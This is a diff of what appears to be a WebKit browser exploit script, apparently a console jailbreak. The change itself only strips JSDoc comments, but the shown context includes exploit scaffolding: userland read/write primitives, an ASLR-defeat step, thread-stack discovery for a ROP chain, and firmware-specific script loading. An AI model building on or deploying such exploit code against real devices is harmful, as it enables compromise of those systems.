@@ -28,20 +28,10 @@ function build_addr(p, buf, family, port, addr) {
     p.write4(buf.add32(0x04), addr);
 }
 
-/** 
- * @param {number} port
- * @returns {number}
- */
 function htons(port) {
     return ((port & 0xFF) << 8) | (port >>> 8);
 }
 
-
-/**
- * @param {UserlandRW|WebkitPrimitives} p 
- * @param {int64} libKernelBase 
- * @returns 
- */
 function find_worker(p, libKernelBase) {
     const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
     const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
@@ -57,10 +47,6 @@ function find_worker(p, libKernelBase) {
     throw new Error("failed to find worker.");
 }
 
-
-/**
- * @enum {number}
- */
 var LogLevel = {
     DEBUG: 0,
     INFO: 1,
@@ -74,11 +60,6 @@ var LogLevel = {
 
 let consoleElem = null;
 let lastLogIsTemp = false;
-/**
- * 
- * @param {string} string 
- * @param {LogLevel} level 
- */
 function log(string, level) {
     if (consoleElem === null) {
         consoleElem = document.getElementById("console");
@@ -115,12 +96,6 @@ const SOCK_DGRAM = 2;
 const IPPROTO_UDP = 17;
 const IPPROTO_IPV6 = 41;
 const IPV6_PKTINFO = 46;
-
-
-/**
- * @param {UserlandRW} p 
- * @returns {Promise<{p: WebkitPrimitives, chain: worker_rop}>}
- */
 async function prepare(p) {
     //ASLR defeat patsy (former vtable buddy)
     let textArea = document.createElement("textarea");
@@ -161,12 +136,6 @@ async function prepare(p) {
         ptr.backing = backing;
         return ptr;
     }
-
-    /**
-     * @param {number} sz 
-     * @param {number} type 
-     * @returns 
-     */
     function malloc(sz, type = 4) {
         let backing;
         if (type == 1) {
@@ -1224,6 +1193,7 @@ let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
 // @ts-ignore
 fwScript.setAttribute('src', `${window.fw_str}.js`);
+
 
 
 
